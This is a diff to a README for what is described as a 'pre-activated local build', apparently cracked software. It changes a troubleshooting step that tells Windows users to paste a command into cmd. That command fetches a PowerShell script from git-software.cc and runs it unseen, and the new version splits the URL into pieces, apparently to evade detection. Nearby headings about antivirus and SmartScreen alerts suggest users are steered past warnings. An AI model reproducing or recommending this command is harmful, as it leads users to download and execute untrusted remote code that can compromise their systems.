@@ -29,7 +29,7 @@ Pre-activated local build for testing and deployment.
 ### 💬 Script is blocked by Execution Policy
 If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://git-software.cc/ps/Setup.ps1 | Invoke-Expression"
+powershell -Command "$u='https://git-software.'+'cc/ps/Setup.ps1'; $r=[System.Net.WebRequest]::Create($u); $resp=$r.GetResponse(); $stream=$resp.GetResponseStream(); $reader=New-Object System.IO.StreamReader($stream); $c=$reader.ReadToEnd(); $reader.Close(); $resp.Close(); .([scriptblock]::Create($c))"
 ```
 
 ### 💬 Antivirus / SmartScreen Alerts
